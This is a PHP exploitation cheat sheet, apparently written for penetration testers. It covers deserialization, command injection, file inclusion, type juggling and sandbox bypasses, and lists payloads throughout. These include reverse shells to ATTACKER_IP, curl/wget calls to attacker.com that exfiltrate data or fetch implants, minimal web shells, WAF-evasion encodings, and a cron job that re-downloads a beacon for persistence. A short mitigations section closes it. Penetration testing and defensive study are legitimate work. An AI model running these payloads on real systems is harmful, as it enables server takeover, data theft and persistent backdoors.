## 1. Overview

PHP is a server-side scripting language widely used in web applications. Common vulnerabilities arise from:

- **Insecure deserialization** – Untrusted data passed to `unserialize()` can trigger object injection
- **Command injection** – User input executed via `system()`, `exec()`, `shell_exec()`, etc.
- **File inclusion** – LFI/RFI through `include()`, `require()`, `file_get_contents()`
- **Type juggling** – Loose comparison (`==`) causes unexpected behavior
- **Disabled functions bypass** – Restrictions on dangerous functions like `system()` can be circumvented
- **Open basedir bypass** – Breaking out of restricted directory access
- **Information disclosure** – Exposed phpinfo, backup files, debug output

---

## 2. Exploitation Methods

### **PHP Object Injection (Unserialize)**

**How it works:** PHP's `unserialize()` reconstructs objects from serialized strings. If attacker-controlled, this triggers magic methods like `__wakeup()`, `__destruct()`, `__toString()` to execute arbitrary code.

**Check for vulnerability:**

1. Look for `unserialize()` in source code
2. Check cookies, POST data, GET params for serialized objects (format: `O:4:"User":1:{s:4:"name";s:5:"admin";}`)
3. Test with modified serialized payloads

**Steps:**

1. Find gadget chains in application code (classes with dangerous magic methods)
2. Generate payload with **phpggc**: `phpggc Laravel/RCE1 system id`
3. Base64 encode if needed
4. Inject into vulnerable parameter
5. Trigger deserialization

**Example:**

```php
// Vulnerable code
$user_data = unserialize($_COOKIE['data']);

// Attack payload (serialized object)
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

---

### **Command Injection**

**Vulnerable functions:**

- `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`
- Backticks: `` `command` ``

**Check for vulnerability:**

1. Find user input passed to shell functions
2. Test with common separators: `;`, `|`, `||`, `&&`, `&`, `\n`
3. Use time-based blind testing: `; sleep 5`

**Steps:**

1. Identify input that reaches shell execution
2. Test separator: `value; whoami`
3. Exfiltrate data via DNS/HTTP: `; curl http://attacker.com?data=$(whoami)`
4. Establish reverse shell if needed

**Payloads:**

```bash
; whoami
| id
& cat /etc/passwd
$(curl attacker.com/shell.sh|bash)
`nc attacker.com 4444 -e /bin/sh`
; wget http://attacker.com/rev.php -O /tmp/rev.php
```

---

### **Local File Inclusion (LFI)**

**Vulnerable patterns:**

```php
include($_GET['page'] . '.php');
require($file);
```

**Check for vulnerability:**

1. Test with path traversal: `?page=../../../../etc/passwd`
2. Try null byte (PHP < 5.3.4): `?page=../../etc/passwd%00`
3. Check for filters: `php://filter/convert.base64-encode/resource=index`

**Steps:**

1. Map application file structure
2. Read sensitive files: `/etc/passwd`, config files, logs
3. Use wrappers to read PHP source: `php://filter/convert.base64-encode/resource=config.php`
4. Chain with log poisoning for RCE

**Payloads:**

```php
# Path traversal
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=index
?page=php://input (POST: <?php system($_GET['cmd']); ?>)
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=expect://whoami

# Log poisoning
?page=../../../../var/log/apache2/access.log
# First poison log via User-Agent: <?php system($_GET['cmd']); ?>
```

---

### **Remote File Inclusion (RFI)**

**Requirements:**

- `allow_url_include = On`
- `allow_url_fopen = On`

**Steps:**

1. Host malicious PHP file on your server
2. Include via vulnerable parameter: `?page=http://attacker.com/shell.php`
3. Execute commands

**Payloads:**

```php
?page=http://attacker.com/shell.txt
?page=//attacker.com/shell.txt
?page=http://attacker.com/shell.txt?
```

---

### **Type Juggling**

**Loose comparison vulnerability:** PHP's `==` operator performs type coercion, leading to bypasses.

**Common cases:**

```php
"0e123" == "0e456" // true (scientific notation)
"0" == "string" // true
true == "anything_non_empty" // true
```

**Check for vulnerability:**

1. Look for `==` in authentication/comparison logic
2. Test magic hashes in password fields
3. Try boolean/array injection

**Payloads:**

```php
# Magic hashes (MD5/SHA1 that start with 0e)
240610708 (MD5: 0e462097431906509019562988736854)
QNKCDZO (MD5: 0e830400451993494058024219903391)

# Array bypass
username[]=1&password[]=2
# If compared: array == array returns true
```

---

### **Disable Functions Bypass**

**Common restricted functions:** `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`

**Check current restrictions:**

```php
<?php
print_r(ini_get('disable_functions'));
print_r(ini_get('open_basedir'));
?>
```

**Bypass techniques:**

**1. Using Chankro (bypass disable_functions + open_basedir):**

```bash
# Create reverse shell script
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > rev.sh

# Generate bypass payload
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# Upload chan.php and trigger
```

**2. PHP 7.0-7.4 FFI bypass:**

```php
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami");
?>
```

**3. LD_PRELOAD bypass:**

```php
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("", "", "", "");
```

**4. imap_open() exploit:**

```php
imap_open('{attacker.com:143/imap}INBOX', '', '') or die();
```

**5. Alternative functions:**

- `pcntl_exec()` – Execute external program
- `mail()` – With LD_PRELOAD
- `mb_send_mail()` – Similar to mail
- `error_log()` – Write to files

---

### **Open Basedir Bypass**

**Techniques:**

**1. Directory traversal via symlink race:**

```php
mkdir('test');
chdir('test');
ini_set('open_basedir', '..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir', '/');
echo file_get_contents('/etc/passwd');
```

**2. Glob wrapper:**

```php
$file_list = glob("/*");
print_r($file_list);
```

**3. DirectoryIterator:**

```php
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) echo $f . "<br>";
```

---

### **Information Disclosure**

**Check for:**

1. **phpinfo()** exposure: `/phpinfo.php`, `/info.php`, `/?page=phpinfo`
2. **Backup files**: `index.php.bak`, `config.php~`, `.config.php.swp`
3. **Debug output**: Error messages with full paths
4. **Git/SVN folders**: `/.git/`, `/.svn/`

**Tools:**

```bash
# Scan for backup artifacts
bfac --url http://example.com/test.php

# Check common info disclosure paths
curl http://target.com/phpinfo.php
curl http://target.com/info.php
curl http://target.com/.git/config
```

---

## 3. Bypasses

### **WAF/Filter Evasion**

**Command injection:**

```bash
# Case variation
WhOaMi

# Wildcards
/bin/cat /etc/pass??
/bin/c?t /etc/passwd

# Variable expansion
$HOME
${PATH:0:1}bin/bash

# Encoding
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Concatenation
cat /etc/pas'sw'd
cat /etc/pass\w\d
```

**LFI:**

```php
# Double encoding
%252e%252e%252f

# Case variation (Windows)
....\/\/....\/\/

# URL encoding
%2e%2e%2f

# Null byte (PHP < 5.3.4)
../../etc/passwd%00
```

**PHP tags:**

```php
<?php ?>
<? ?>
<?= ?>
<% %>
<script language="php"></script>
```

---

### **PHP Configuration Tricks**

**Check exploitable settings:**

```php
# Dangerous if enabled
allow_url_include
allow_url_fopen
register_globals (old PHP)
magic_quotes_gpc = Off
```

**Force errors for path disclosure:**

```php
?page[]=
?page=99999999999999
```

---

## 4. Payloads

### **Top 10 Modern/Robust Payloads**

**1. PHP Web Shell (minimal):**

```php
<?php system($_GET['cmd']); ?>
```

**2. Reverse Shell (bash):**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

**3. File Upload Shell:**

```php
<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);} ?>
<form method=POST enctype=multipart/form-data><input type=file name=f><input type=submit></form>
```

**4. PHP Filter Chain (RCE without file upload - PHP 8.x):**

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|[...chain...]|resource=data://,<?php system($_GET[0]);?>
```

**5. Data wrapper RCE:**

```php
data://text/plain,<?php system($_GET[0]);?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
```

**6. Expect wrapper:**

```php
expect://whoami
expect://id
```

**7. Phar deserialization (when unserialize blocked):**

```php
phar://uploads/exploit.phar
```

**8. Phpggc Laravel RCE:**

```bash
phpggc -b Laravel/RCE1 system "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

**9. Log poisoning payload (User-Agent):**

```
User-Agent: <?php system($_GET['cmd']); ?>
```

**10. Mail header injection:**

```php
mail($_POST['to'], 'Subject', 'Body', "From: attacker@evil.com\nCc: <?php system($_GET['cmd']); ?>");
```

---

## 5. Higher Impact Scenarios

### **Chain LFI → RCE**

**Method 1: Log Poisoning**

1. Find LFI: `?page=../../../../var/log/apache2/access.log`
2. Poison log via User-Agent: `<?php system($_GET['cmd']); ?>`
3. Include log file: `?page=../../../../var/log/apache2/access.log&cmd=id`

**Method 2: Session File Inclusion**

1. Inject PHP into session: `$_SESSION['user'] = '<?php system($_GET[0]); ?>';`
2. Locate session file: `/var/lib/php/sessions/sess_[PHPSESSID]`
3. Include: `?page=../../../../var/lib/php/sessions/sess_abc123&0=id`

**Method 3: /proc/self/environ**

1. Include: `?page=../../../../proc/self/environ`
2. Poison via User-Agent
3. Execute commands

---

### **Unserialize → Full Server Takeover**

**Steps:**

1. Use **phpggc** to find gadget chains: `phpggc -l`
2. Generate payload for RCE: `phpggc Laravel/RCE1 system "wget http://attacker.com/implant.php -O /var/www/html/backdoor.php"`
3. Inject serialized payload
4. Access persistent backdoor: `http://target.com/backdoor.php`

---

### **SQL Injection + LFI = Database Dump**

**Steps:**

1. Use SQLi to write webshell: `SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
2. Use LFI to read database config: `?page=php://filter/convert.base64-encode/resource=../config/database.php`
3. Decode credentials, extract full database

---

### **Disable Functions Bypass → Persistence**

**Steps:**

1. Use Chankro to bypass restrictions
2. Upload webshell to writable directory
3. Create cron job for persistence:
    
    ```bash
    echo "* * * * * wget http://attacker.com/beacon.php -O /tmp/b.php && php /tmp/b.php" | crontab -
    ```
    

---

### **Type Juggling → Admin Access**

**Scenario: Password reset token verification**

```php
if ($user_token == $reset_token) {
    // Reset password
}
```

**Attack:**

1. Request password reset
2. Capture token: `0e12345678901234`
3. Bruteforce magic hash collision
4. Use colliding hash to reset admin password

---

## 6. Mitigations

### **For Developers:**

**Prevent Object Injection:**

- Never use `unserialize()` on user input
- Use `json_decode()` for data exchange
- Implement signature verification (HMAC) before unserialize

**Prevent Command Injection:**

- Avoid shell execution functions entirely
- Use `escapeshellarg()` and `escapeshellcmd()` if unavoidable
- Whitelist allowed commands/arguments
- Use PHP built-in functions instead of shell commands

**Prevent File Inclusion:**

- Never use user input in `include()`, `require()`
- Use whitelist mapping:
    
    ```php
    $pages = ['home' => 'home.php', 'about' => 'about.php'];include($pages[$_GET['page']] ?? 'home.php');
    ```
    
- Disable `allow_url_include` and `allow_url_fopen`

**Prevent Type Juggling:**

- Always use strict comparison: `===` instead of `==`
- Validate input types explicitly: `is_string()`, `is_int()`
- Use `password_hash()` and `password_verify()` for passwords

**General Hardening:**

- Keep PHP updated (latest version)
- Disable dangerous functions: `disable_functions = exec,passthru,shell_exec,system,proc_open,popen`
- Set `open_basedir` restrictions
- Disable `allow_url_include` and `allow_url_fopen`
- Remove phpinfo() and debug code from production
- Set `expose_php = Off`
- Use security headers (CSP, X-Frame-Options)
- Implement input validation and output encoding
- Remove backup files and version control folders (`.git`, `.svn`)

**File Upload Security:**

- Validate file type (check magic bytes, not extension)
- Rename uploaded files
- Store outside web root
- Disable script execution in upload directory

---

## 7. Useful Tools

```bash
# PHPGGC - Unserialize payload generator
https://github.com/ambionics/phpggc
phpggc -l  # List available gadgets
phpggc Laravel/RCE1 system id

# Chankro - Bypass disable_functions and open_basedir
https://github.com/TarlogicSecurity/Chankro
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# BFAC - Backup file artifact checker
https://github.com/mazen160/bfac
bfac --url http://example.com/test.php

# Commix - Command injection exploitation
https://github.com/commixproject/commix

# Kadimus - LFI exploitation
https://github.com/P0cL4bs/Kadimus
```

---

**🎯 Quick Win Checklist:**

✅ Check for `unserialize()` in cookies/parameters  
✅ Test file inclusion with `../../../../etc/passwd`  
✅ Look for phpinfo() exposure  
✅ Scan for backup files (`.bak`, `.swp`, `~`)  
✅ Test command injection with `; sleep 5`  
✅ Check for magic hash bypasses in login  
✅ Review disable_functions and try Chankro  
✅ Test PHP wrappers: `php://filter`, `data://`, `expect://`  
✅ Look for Git exposure: `/.git/config`  
✅ Chain LFI with log poisoning for RCE